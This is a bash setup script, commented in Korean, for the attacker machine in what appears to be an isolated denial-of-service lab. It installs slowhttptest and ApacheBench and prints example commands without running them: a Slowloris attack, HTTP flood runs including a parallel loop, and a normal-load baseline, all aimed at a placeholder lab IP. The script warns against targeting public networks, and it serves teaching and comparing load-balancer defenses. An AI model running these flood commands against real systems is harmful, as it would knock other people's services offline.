#!/usr/bin/env bash
#
# roles/attacker.sh - 부하/공격 도구 설치만 (실제 공격은 실행하지 않음)
#   slowhttptest : Slowloris 계열 느린 요청 공격 도구
#   apache2-utils: ab (ApacheBench) - 정상 부하/처리량 측정
# 설치에는 root(sudo)가 필요하지만, 실제 공격 실행은 일반 사용자로 한다.
set -euo pipefail

# --- 1) 도구 설치 (멱등) ---
for pkg in slowhttptest apache2-utils; do
  if dpkg -s "$pkg" >/dev/null 2>&1; then
    echo "[=] $pkg 이미 설치됨 - skip"
  else
    echo "[*] $pkg 설치 ..."
    DEBIAN_FRONTEND=noninteractive apt-get install -y -qq "$pkg"
  fi
done

# --- 2) 자체 검증: 도구 버전 확인 ---
echo
echo "----- 자체 검증 (attacker) -----"
slowhttptest -h 2>&1 | head -n1 || true
ab -V | head -n1
echo "[OK] slowhttptest / ab 설치 확인"

# --- 3) 참고: 데모용 공격 명령 (여기서 실행하지 않음. README 데모 순서 참고) ---
cat <<'TIP'

[참고] 데모 시 공격 명령 예시 (직접 타이핑해서 실행. 격리된 랩망 안에서만!):
  # (1) Slowloris - 느린 헤더로 커넥션 고갈 (저대역폭, victim 다운에 가장 확실)
  slowhttptest -c 500 -H -i 10 -r 200 -t GET -u http://<대상-IP>/ -x 24 -p 3

  # (2) HTTP Flood - 대량 요청 (사양 낮춘 victim OOM / 처리량 비교)
  ab -n 200000 -c 500 -k http://<대상-IP>/
  #  더 세게(병렬):
  for i in 1 2 3 4; do ab -n 100000 -c 300 -k http://<대상-IP>/ & done; wait

  # (3) 정상 부하 측정 (대조)
  ab -n 1000 -c 50 http://<대상-IP>/

  <대상-IP> 비교 순서:
    victim IP (단일 apache)   -> 죽거나 지연 폭증
    서비스 VIP (lb 뒤 web×3)  -> timeout 방어 + 3대 분산으로 버팀
  주의: 공용 인터넷/클라우드 공유망으로는 절대 쏘지 말 것(타인 인프라 영향).
TIP
